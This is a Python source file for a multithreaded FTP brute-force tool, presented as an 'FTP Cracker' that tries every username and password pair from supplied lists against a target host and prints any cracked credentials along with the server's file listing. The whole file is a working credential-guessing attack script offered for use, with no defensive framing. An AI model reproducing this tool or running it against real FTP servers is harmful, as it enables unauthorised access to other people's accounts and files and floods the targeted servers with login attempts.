import threading, argparse, time
from datetime import datetime
from ftplib import FTP


def login(host, user, passw, ptime):
    try:
        with FTP(host) as ftp:
            files = ""
            ftp.login(user, passw)


            ctime = int(time.time())
            taken = int(ctime) - int(ptime)

            for file in ftp.nlst():
                files += f"{file} "
            print(f"""  
[STATUS]     >   CRACKED
[END]        >   {datetime.now().strftime('%H:%M:%S')}
[TAKEN]      >   {taken}s
[TARGET]     >   {host}
[USERNAME]   >   {user}
[PASSWORD]   >   {passw}
[FILES]      >   {files}
            """)


    except:
        pass



def load_passwords(file):
    with open(file) as f:
        return [password for password in f.read().splitlines()]

def load_usernames(file):
    with open(file) as f:
        return [username for username in f.read().splitlines()]




def main():
    art = """
╔═╗╔╦╗╔═╗  ╔═╗╔═╗╦═╗╔═╗╔═╗╦═╗
╠╣  ║ ╠═╝  ╠╣ ║ ║╠╦╝║  ║╣ ╠╦╝
╚   ╩ ╩    ╚  ╚═╝╩╚═╚═╝╚═╝╩╚═
> FTP bruteforcer
> Developed by /jwe0"""
    print(art)

    parser = argparse.ArgumentParser(description="FTP Bruteforcer")

    parser.add_argument("--target", "-t", help="Target to attacck")
    parser.add_argument("--userlist", "-ul", help="List of usernames")
    parser.add_argument("--passlist", "-pl", help="List of passwords")

    args = parser.parse_args()

    if args.target:
        
        passwords = load_passwords(args.passlist)
        usernames = load_usernames(args.userlist)

        print(f"""
[START]      >   {datetime.now().strftime('%H:%M:%S')}
[TARGET]     >   {args.target}
[PASSWORDS]  >   {args.passlist} | {len(passwords)}
[USERNAMES]  >   {args.userlist} | {len(usernames)}""")
    

        for username in usernames:
            for password in passwords:
                threading.Thread(target=login, args=[args.target, username, password, time.time()]).start()



main()
#login("test.rebex.net", "demo", "password")
